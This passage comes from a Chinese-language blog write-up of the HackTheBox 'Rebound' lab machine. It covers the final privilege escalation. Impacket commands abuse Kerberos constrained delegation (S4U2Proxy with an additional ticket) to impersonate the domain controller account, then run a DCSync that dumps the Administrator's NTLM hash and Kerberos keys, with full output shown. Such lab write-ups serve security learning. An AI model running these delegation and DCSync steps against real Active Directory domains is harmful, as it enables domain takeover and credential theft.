<p>可以使用这张票再伪造<code>dc01$</code>（s4u2self时候就决定了这张是dc01$的st所以这里必须是【笑）去请求<code>http/dc01.rebound.htb</code>，把st给附加上以越过<code>s4u2Self</code>，使用我们的<code>st</code>发起<code>s4u2proxy</code>.（因为这个阶段是用DELEGATOR账户来发起至<code>dc01</code>的委派请求，不要忘记切换凭证）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$  impacket-getST -k -dc-ip 10.10.11.231 -spn &#x27;http/dc01.rebound.htb&#x27; -impersonate &#x27;dc01$&#x27; -additional-ticket dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache &#x27;rebound.htb/delegator$&#x27; -no-pass</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Impersonating dc01$</span><br><span class="line">[*]     Using additional ticket dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>拿到<code>dc01$</code>在dc01的票据了，看下<code>dc01$</code>权限</p>
<p><img src="/wpimages/2024/tracks-ad/Rebound/image-12.png" alt="alt text"></p>
<p>有dcsync，dumphash结束</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-secretsdump  -k -just-dc-user administrator  dc01.rebound.htb</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f</span><br><span class="line">Administrator:des-cbc-md5:ad8ac2a825fe1080</span><br></pre></td></tr></table></figure>

<p>参考文档：</p>
<p><a target="_blank" rel="noopener" href="http://chen.oinsm.com/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/">http://chen.oinsm.com/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/</a> (原文404了，所以贴了国内的翻译版)</p>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#_2-additional-s4u2proxy">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#_2-additional-s4u2proxy</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus/pull/139">https://github.com/GhostPack/Rubeus/pull/139</a></p>
<p><a target="_blank" rel="noopener" href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">https://www.semperis.com/blog/new-attack-paths-as-requested-sts/</a></p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/12/14/box-wp-Unrested/"
      title="【CVE machines】 htb Unrested wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【CVE machines】 htb Unrested wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/08/Tracks-cloud-Unobtianium/"
      title="Tracks-cloud-Unobtianium"
     >

    <p class="title-text">
      
        Tracks-cloud-Unobtianium
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


